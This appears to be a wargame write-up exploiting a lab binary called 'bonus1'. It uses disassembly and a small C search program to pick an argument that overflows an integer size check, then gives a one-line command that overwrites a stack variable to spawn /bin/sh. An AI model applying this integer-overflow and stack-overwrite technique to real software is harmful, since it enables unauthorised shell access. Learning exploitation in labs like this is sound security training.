After reversing the binary, we can see the program takes 2 parameters.

To pass the first condition 
0x8048441:   83 7c 24 3c 09            	cmp dword ptr [esp + 0x3c], 9

atoi of argv1 must be lower than 10.

further away, we can see an execl call

0x8048482:   c7 44 24 08 00 00 00 00   	mov dword ptr [esp + 8], 0
0x804848a:   c7 44 24 04 80 85 04 08   	mov dword ptr [esp + 4], 0x8048580 ; "sh"
0x8048492:   c7 04 24 83 85 04 08      	mov dword ptr [esp], 0x8048583 ; "/bin/sh"

To access this call, argv[1] must be equal to 0x574f4c46

0x8048478:   81 7c 24 3c 46 4c 4f 57   	cmp dword ptr [esp + 0x3c], 0x574f4c46

To do this, we will overwrite esp + 0x3c value (atoi of argv1), with the memcpy

0x8048468:   89 4c 24 08               	mov dword ptr [esp + 8], ecx
0x804846c:   89 54 24 04               	mov dword ptr [esp + 4], edx
0x8048470:   89 04 24                  	mov dword ptr [esp], eax
0x8048473:   e8 a8 fe ff ff            	call 0x8048320 <memcpy>

The value to overwrite is 40 bytes atfer the beginning of the buffer.

The memcpy size is argv(1) * 4.
So, we will have to overflow the int because we want the size of memcpy equal to 44, because 4 * 9 (max size allowed) < 44 .

We write a small code to find a negative value wihch multipled by 4 equal to 44 by underflow:

#include <stdio.h>


int main()
{
    for (int i=-1; i > -2147483648 ; i--) {
        int x = i * 4;
        if (x == 44) {
            printf("i = %d, x = %d\n", i, x);
        }
    }
    return 0;
}

-->

i = -1073741813, x = 44
i = -2147483637, x = 44

So we can use -1073741813 or -2147483637 as argv[1], and 40 any char + 0x574f4c46 value as argv[2].

./bonus1 -1073741813 $(python -c 'print "\x90"*40 + "\x57\x4f\x4c\x46"[::-1]')
